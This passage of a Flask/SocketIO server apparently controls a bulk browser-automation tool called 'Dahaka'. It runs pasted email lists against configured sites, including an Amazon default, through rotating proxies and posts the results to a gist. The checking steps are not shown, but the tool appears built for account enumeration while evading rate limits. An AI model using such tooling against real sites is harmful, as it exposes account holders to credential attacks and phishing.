                    full_text = "# Dahaka Results\n" + new_text
                    add_log("Mode: New — replacing all results...", "info")
                else:
                    add_log("Mode: Add — fetching current gist content...", "info")
                    current_content = _gist_client.get_content()
                    if current_content and current_content.strip() and current_content.strip() != '# Dahaka Results\nWaiting for results...':
                        full_text = current_content.rstrip("\n") + "\n" + new_text
                    else:
                        full_text = "# Dahaka Results\n" + new_text
                    
                if _gist_client.update(full_text):
                    add_log("✅ Results updated to Gist", "good")
                else:
                    add_log("Failed to update Gist.", "error")
            except Exception as ex:
                add_log(f"Gist upload failed: {ex}", "error")
            # -------------------------

            is_running = False
            is_finished = True
            socketio.emit('check_finished', {'job_id': current_job_id, 'success': success_count, 'failure': failure_count})
        else:
            add_log(f'⏹ Job {my_generation} exiting (stopped)', 'warn')
    except Exception as e:
        # Only report errors if this job is still current
        if job_generation == my_generation:
            add_log(f'💥 Fatal: {str(e)}', 'bad')
            if current_job_id:
                db.update_job(current_job_id, {'status': 'failed', 'finished_at': datetime.now().isoformat()})
            is_running = False
            is_finished = True
            socketio.emit('error', {'message': str(e)})

# ── Flask Routes ───────────────────────────────────────────────────
@app.route('/')
def index():
    return redirect(url_for('config_page'))

@app.route('/config')
def config_page():
    return render_template('config.html')

@app.route('/automation')
def automation_page():
    return render_template('automation.html')

@app.route('/job')
def job_page():
    return render_template('job.html')

@app.route('/email-lists')
def email_lists_page():
    return render_template('email_lists.html')

# ── REST API ───────────────────────────────────────────────────────
@app.route('/api/config', methods=['GET'])
def api_get_config():
    return jsonify(db.get_config())

@app.route('/api/config', methods=['POST'])
def api_save_config():
    data = flask_request.get_json()
    db.save_config(data)
    add_log('💾 Config saved', 'good')
    return jsonify(db.get_config())

@app.route('/api/toggle-paste-mode', methods=['POST'])
def api_toggle_paste_mode():
    global paste_mode
    paste_mode = 'new' if paste_mode == 'add' else 'add'
    return jsonify({'mode': paste_mode})

@app.route('/api/domains', methods=['GET'])
def api_get_domains():
    return jsonify(db.get_domains())

@app.route('/api/domains/<int:did>/steps', methods=['GET'])
def api_get_steps(did):
    return jsonify(db.get_steps(did))

@app.route('/api/jobs', methods=['GET'])
def api_get_jobs():
    return jsonify(db.get_jobs())

@app.route('/api/rotated_proxies', methods=['GET'])
def api_get_rotated_proxies():
    return jsonify(db.get_rotated_proxies())

@app.route('/api/rotated_proxies', methods=['POST'])
def api_add_rotated_proxy():
    data = flask_request.get_json()
    ip = data.get('ip', '').strip()
    port = data.get('port', 0)
    if ip and port:
        db.add_rotated_proxy(ip, int(port))
        add_log(f'➕ Rotated proxy added: {ip}:{port}', 'good')
    return jsonify(db.get_rotated_proxies())

@app.route('/api/rotated_proxies/<int:pid>', methods=['DELETE'])
def api_delete_rotated_proxy(pid):
    db.delete_rotated_proxy(pid)
    add_log(f'🗑 Rotated proxy removed', 'warn')
    return jsonify(db.get_rotated_proxies())

@app.route('/api/job/start', methods=['POST'])
def api_start_job():
    global bg_thread, is_stopped, is_paused, current_email_list_id
    if _cleanup_in_progress:
        return jsonify({'error': 'Server is cleaning up from previous job. Please wait a few seconds.'}), 409
    if bg_thread and bg_thread.is_alive():
        add_log('⚠ Old job thread still alive — force-killing before new start', 'warn')
        force_stop_old_job()
    if is_running:
        return jsonify({'error': 'A job is already running'}), 400
    data = flask_request.get_json()
    domain_id = data.get('domain_id')
    domain_ids = data.get('domain_ids')
    emails_raw = data.get('emails', '')
    emails = [e.strip() for e in emails_raw.strip().splitlines() if e.strip()]
    emails = clean_emails(emails)
    if not emails:
        return jsonify({'error': 'No valid emails provided'}), 400
    if not domain_id and not domain_ids:
        return jsonify({'error': 'No domain selected'}), 400
    reset_job_state()
    is_stopped = False
    is_paused = False
    pause_event.set()
    current_email_list_id = data.get('email_list_id')
    if current_email_list_id:
        current_email_list_id = int(current_email_list_id)
        add_log(f'📋 Job linked to email list #{current_email_list_id}', 'info')
    else:
        # Auto-create a new email list for this job
        domain_name = ''
        if domain_ids:
            names = []
            for did in (domain_ids if isinstance(domain_ids, list) else [domain_ids]):
                d = db.get_domain(int(did))
                if d:
                    names.append(d['name'])
            domain_name = ', '.join(names) if names else 'Job'
        elif domain_id:
            d = db.get_domain(int(domain_id))
            domain_name = d['name'] if d else 'Job'
        else:
            domain_name = 'Job'
        ts = datetime.now().strftime('%b %d %H:%M')
        list_name = f'{domain_name} — {ts}'
        current_email_list_id = db.create_email_list(list_name, f'Auto-created for job with {len(emails)} emails')
        db.add_emails_to_list(current_email_list_id, emails)
        add_log(f'📋 Auto-created email list "{list_name}" (#{current_email_list_id}) with {len(emails)} emails', 'good')
    bg_thread = threading.Thread(target=background_job, args=(domain_id, emails, domain_ids))
    bg_thread.start()
    return jsonify({'status': 'started', 'emails': len(emails)})

@app.route('/api/job/stop', methods=['POST'])
def api_stop_job():
    global is_stopped, is_running, job_generation, _cleanup_in_progress
    is_stopped = True
    _cleanup_in_progress = True
    job_generation += 1
    pause_event.set()  # unblock paused threads so they can exit
    add_log('⏹ Job stopped by user — killing all browsers...', 'bad')
    jid = current_job_id
    if jid:
        db.update_job(jid, {'status': 'stopped', 'finished_at': datetime.now().isoformat()})
    # Return immediately — do heavy cleanup in background so the client isn't blocked
    threading.Thread(target=_stop_cleanup, daemon=True).start()
    return jsonify({'status': 'stopped'})

@app.route('/api/job/pause', methods=['POST'])
def api_pause_job():
    global is_paused
    if not is_running:
        return jsonify({'error': 'No job running'}), 400
    is_paused = True
    pause_event.clear()
    add_log('⏸ Job paused', 'warn')
    return jsonify({'status': 'paused'})

@app.route('/api/job/resume', methods=['POST'])
def api_resume_job():
    global is_paused
    if not is_running:
        return jsonify({'error': 'No job running'}), 400
    is_paused = False
    pause_event.set()
    add_log('▶ Job resumed', 'good')
    return jsonify({'status': 'resumed'})

@app.route('/api/jobs/<jid>/results', methods=['GET'])
def api_get_results(jid):
    return jsonify(db.get_results(jid))

# ── Email Lists REST API ───────────────────────────────────────────
@app.route('/api/email-lists', methods=['GET'])
def api_get_email_lists():
    return jsonify(db.get_email_lists())

@app.route('/api/email-lists', methods=['POST'])
def api_create_email_list():
    data = flask_request.get_json()
    name = data.get('name', '').strip()
    if not name:
        return jsonify({'error': 'List name is required'}), 400
    description = data.get('description', '')
    list_id = db.create_email_list(name, description)
    # If emails provided, add them immediately
    emails_raw = data.get('emails', '')
    if emails_raw:
        emails = [e.strip() for e in emails_raw.strip().splitlines() if e.strip()]
        db.add_emails_to_list(list_id, emails)
    add_log(f'📋 Email list created: {name}', 'good')
    return jsonify({'id': list_id, 'name': name})

@app.route('/api/email-lists/<int:lid>', methods=['PUT'])
def api_update_email_list(lid):
    data = flask_request.get_json()
    db.update_email_list(lid, data)
    return jsonify({'ok': True})

@app.route('/api/email-lists/<int:lid>', methods=['DELETE'])
def api_delete_email_list(lid):
    db.delete_email_list(lid)
    add_log(f'🗑 Email list deleted: {lid}', 'warn')
    return jsonify({'ok': True})

@app.route('/api/email-lists/<int:lid>/entries', methods=['GET'])
def api_get_email_list_entries(lid):
    return jsonify(db.get_email_list_entries(lid))

@app.route('/api/email-lists/<int:lid>/import', methods=['POST'])
def api_import_emails_to_list(lid):
    data = flask_request.get_json()
    source = data.get('source', 'paste')  # 'paste' or 'job'
    if source == 'job':
        job_id = data.get('job_id', '')
        if not job_id:
            return jsonify({'error': 'job_id is required'}), 400
        count = db.import_emails_from_job(lid, job_id)
        return jsonify({'imported': count, 'source': 'job'})
    else:
        emails_raw = data.get('emails', '')
        emails = [e.strip() for e in emails_raw.strip().splitlines() if e.strip()]
        if not emails:
            return jsonify({'error': 'No emails provided'}), 400
        added = db.add_emails_to_list(lid, emails)
        return jsonify({'added': added, 'source': 'paste'})

@app.route('/api/email-lists/<int:lid>/entries/<int:eid>', methods=['PUT'])
def api_update_email_entry(lid, eid):
    data = flask_request.get_json()
    domain_id = data.get('domain_id')
    result = data.get('result', '')
    if domain_id is None:
        return jsonify({'error': 'domain_id is required'}), 400
    db.update_email_entry_result(eid, domain_id, result)
    return jsonify({'ok': True})

@app.route('/api/email-lists/<int:lid>/remove-entries', methods=['POST'])
def api_remove_entries(lid):
    data = flask_request.get_json()
    entry_ids = data.get('entry_ids', [])
    if not entry_ids:
        return jsonify({'error': 'No entries specified'}), 400
    db.remove_emails_from_list(lid, entry_ids)
    return jsonify({'ok': True, 'removed': len(entry_ids)})

@app.route('/api/email-lists/<int:lid>/export', methods=['GET'])
def api_export_email_list(lid):
    from flask import Response
    content = db.export_email_list_pipe(lid)
    if not content:
        return jsonify({'error': 'List not found'}), 404
    lst = db.get_email_list(lid)
    filename = f"email_list_{lst['name'].replace(' ', '_') if lst else lid}.txt"
    return Response(
        content,
        mimetype='text/plain',
        headers={'Content-Disposition': f'attachment; filename={filename}'}
    )

@app.route('/api/email-lists/<int:lid>/bulk-update', methods=['POST'])
def api_bulk_update_results(lid):
    data = flask_request.get_json()
    domain_id = data.get('domain_id')
    results_map = data.get('results', {})
    if not domain_id or not results_map:
        return jsonify({'error': 'domain_id and results are required'}), 400
    updated = db.bulk_update_results(lid, domain_id, results_map)
    return jsonify({'ok': True, 'updated': updated})

@app.route('/api/email-lists/<int:lid>/emails', methods=['GET'])
def api_get_emails_for_job(lid):
    mode = flask_request.args.get('mode', 'all')
    domain_ids_str = flask_request.args.get('domain_ids', '')
    domain_ids = [int(x) for x in domain_ids_str.split(',') if x.strip()] if domain_ids_str else []
    emails = db.get_emails_for_job(lid, mode, domain_ids)
    return jsonify({'emails': emails, 'count': len(emails)})


# ── Socket Events ──────────────────────────────────────────────────
@socketio.on('save_config')
def handle_save_config(data):
    db.save_config(data)
    add_log('💾 Config saved', 'good')
    emit('config_saved', db.get_config(), broadcast=True)

@socketio.on('add_domain')
def handle_add_domain(data):
    did = db.add_domain(data.get('name', ''), data.get('url', ''), data.get('letter', ''))
    add_log(f'➕ Domain added: {data.get("name")}', 'good')
    db.sync_domain_added(did)
    emit('domains_updated', db.get_domains(), broadcast=True)

@socketio.on('update_domain')
def handle_update_domain(data):
    did = data.pop('id', None)
    if did:
        db.update_domain(did, data)
        emit('domains_updated', db.get_domains(), broadcast=True)

@socketio.on('delete_domain')
def handle_delete_domain(data):
    did = data.get('id')
    if did:
        try:
            db.sync_domain_removed(did)
            db.delete_domain(did)
            add_log(f'🗑 Domain deleted: {did}', 'warn')
            emit('domains_updated', db.get_domains(), broadcast=True)
        except Exception as e:
            add_log(f'✗ Failed to delete domain: {str(e)}', 'bad')
            emit('error', {'message': f'Failed to delete domain: {str(e)}'})

@socketio.on('save_steps')
def handle_save_steps(data):
    did = data.get('domain_id')
    steps = data.get('steps', [])
    if did:
        db.save_steps(did, steps)
        add_log(f'💾 Steps saved for domain {did}', 'good')
        emit('steps_saved', {'domain_id': did}, broadcast=True)

@socketio.on('start_job')
def handle_start_job(data):
    global bg_thread, is_stopped, is_paused, current_email_list_id
    if _cleanup_in_progress:
        emit('error', {'message': 'Server is cleaning up from previous job. Please wait a few seconds.'})
        return
    if bg_thread and bg_thread.is_alive():
        add_log('⚠ Old job thread still alive — force-killing before new start', 'warn')
        force_stop_old_job()
    if is_running:
        emit('error', {'message': 'A job is already running'})
        return
    domain_id = data.get('domain_id')
    domain_ids = data.get('domain_ids')
    emails_raw = data.get('emails', '')
    emails = [e.strip() for e in emails_raw.strip().splitlines() if e.strip()]
    emails = clean_emails(emails)
    if not emails:
        emit('error', {'message': 'No valid emails provided'})
        return
    if not domain_id and not domain_ids:
        emit('error', {'message': 'No domain selected'})
        return
    reset_job_state()
    is_stopped = False
    is_paused = False
    pause_event.set()
    current_email_list_id = data.get('email_list_id')
    if current_email_list_id:
        current_email_list_id = int(current_email_list_id)
        add_log(f'📋 Job linked to email list #{current_email_list_id}', 'info')
    else:
        # Auto-create a new email list for this job
        domain_name = ''
        if domain_ids:
            names = []
            for did in (domain_ids if isinstance(domain_ids, list) else [domain_ids]):
                d = db.get_domain(int(did))
                if d:
                    names.append(d['name'])
            domain_name = ', '.join(names) if names else 'Job'
        elif domain_id:
            d = db.get_domain(int(domain_id))
            domain_name = d['name'] if d else 'Job'
        else:
            domain_name = 'Job'
        ts = datetime.now().strftime('%b %d %H:%M')
        list_name = f'{domain_name} — {ts}'
        current_email_list_id = db.create_email_list(list_name, f'Auto-created for job with {len(emails)} emails')
        db.add_emails_to_list(current_email_list_id, emails)
        add_log(f'📋 Auto-created email list "{list_name}" (#{current_email_list_id}) with {len(emails)} emails', 'good')
    bg_thread = threading.Thread(target=background_job, args=(domain_id, emails, domain_ids))
    bg_thread.start()

@socketio.on('pause_job')
def handle_pause_job():
    global is_paused
    if not is_running:
        return
    is_paused = True
    pause_event.clear()  # block worker threads
    add_log('⏸ Job paused', 'warn')
    emit('job_paused', broadcast=True)

@socketio.on('resume_job')
def handle_resume_job():
    global is_paused
    if not is_running:
        return
    is_paused = False
    pause_event.set()  # unblock worker threads
    add_log('▶ Job resumed', 'good')
    emit('job_resumed', broadcast=True)

@socketio.on('stop_job')
def handle_stop_job():
    global is_stopped, is_running, job_generation, _cleanup_in_progress
    is_stopped = True
    _cleanup_in_progress = True
    job_generation += 1  # invalidate all running workers immediately
    pause_event.set()  # unblock paused threads so they can exit
    add_log('⏹ Job stopped by user — killing all browsers...', 'bad')
    jid = current_job_id
    if jid:
        db.update_job(jid, {'status': 'stopped', 'finished_at': datetime.now().isoformat()})
    # Emit immediately so the client UI shows STOPPING (don't block on cleanup)
    emit('job_stopped', broadcast=True)
    # Do the heavy cleanup (kill browsers, join threads) in a background thread
    # so we don't block the SocketIO event loop
    threading.Thread(target=_stop_cleanup, daemon=True).start()

def _stop_cleanup():
    """Background cleanup after stop — runs off the SocketIO/HTTP thread so it doesn't block.
    Sets _cleanup_in_progress=True at entry (done by caller), clears it at exit.
    No server restart — just clean up and return to IDLE."""
    global is_running, _cleanup_in_progress
    try:
        # 1. Force-quit all open browser windows immediately (includes double-kill)
        kill_all_browsers()
        # 2. Drain queues and send poison pills to unblock stuck workers
        drain_all_queues()
        # 3. Wait for ALL worker threads with a shared deadline (not per-thread)
        #    Workers should exit quickly since is_stopped=True and browsers are dead.
        deadline = time.time() + 10  # 10s total for all workers
        for t in list(active_worker_threads):
            remaining = max(0.1, deadline - time.time())
            try:
                t.join(timeout=remaining)
            except Exception:
                pass
            if time.time() >= deadline:
                break
        # 4. Wait for background thread with remaining time
        remaining = max(0.1, deadline - time.time())
        if bg_thread and bg_thread.is_alive():
            bg_thread.join(timeout=remaining)
        # 5. Quick final taskkill to catch any stragglers (no sleep, lightweight)
        try:
            subprocess.run(['taskkill', '/F', '/IM', 'chromedriver.exe'], capture_output=True, timeout=3)
        except Exception:
            pass
        # 6. Verify all drivers are cleaned up
        with active_drivers_lock:
            if active_drivers:
                add_log(f'⚠ {len(active_drivers)} zombie drivers after cleanup — clearing', 'warn')
                active_drivers.clear()
        # 7. Full state reset (also clears _cleanup_in_progress)
        is_running = False
        reset_job_state()
        add_log('✅ Cleanup complete — ready for new job', 'good')
        # 8. Notify frontend that cleanup is done
        socketio.emit('cleanup_complete')
    except Exception as e:
        add_log(f'💥 Cleanup error: {str(e)}', 'bad')
        _cleanup_in_progress = False
        is_running = False

@socketio.on('set_proxy_mode')
def handle_set_proxy_mode(data):
    mode = data.get('mode', 'local_file')
    if mode in ('local_file', 'rotated_ip', 'no_proxy'):
        db.save_config({'proxy_mode': mode})
        add_log(f'🔀 Proxy mode → {mode}', 'info')
        emit('proxy_mode_changed', {'mode': mode}, broadcast=True)

@socketio.on('add_rotated_proxy')
def handle_add_rotated_proxy(data):
    ip = data.get('ip', '').strip()
    port = data.get('port', 0)
    if ip and port:
        db.add_rotated_proxy(ip, int(port))
        add_log(f'➕ Rotated proxy added: {ip}:{port}', 'good')
        emit('rotated_proxies_updated', db.get_rotated_proxies(), broadcast=True)

@socketio.on('delete_rotated_proxy')
def handle_delete_rotated_proxy(data):
    pid = data.get('id')
    if pid:
        db.delete_rotated_proxy(pid)
        add_log(f'🗑 Rotated proxy removed', 'warn')
        emit('rotated_proxies_updated', db.get_rotated_proxies(), broadcast=True)

# ── Init & Run ─────────────────────────────────────────────────────
db.init_db()
db.seed_amazon_default()

if __name__ == '__main__':
    threading.Thread(target=update_status, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)